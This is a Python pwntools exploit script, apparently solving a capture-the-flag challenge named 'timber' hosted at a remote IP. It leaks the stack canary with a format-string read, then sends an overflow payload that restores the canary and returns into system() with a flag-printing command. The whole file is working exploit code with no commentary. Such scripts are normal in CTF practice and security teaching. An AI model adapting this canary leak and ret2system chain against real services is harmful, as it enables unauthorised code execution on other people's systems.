from pwn import *

context(arch='i386', os='linux')
# p = process('./timber')
p = remote('18.222.250.47 ', 12345)

flag_cmd = 0x8048ba0
system = 0x08048500

p.sendline('%17$x')
p.recvuntil('Alright ')
leak = p.recvuntil('\n').strip()
canary = int(leak, 16)

log.info('Canary: {}'.format(hex(canary)))

payload = ''
payload += 'a' * 48
payload += p32(canary)
payload += 'a' * 8
payload += p32(system)
payload += 'a' * 4
payload += p32(flag_cmd)

p.sendline('s')

p.sendline(payload)
p.recvuntil('same.\n')
flag = p.recvuntil('\n').strip()
log.success(flag)
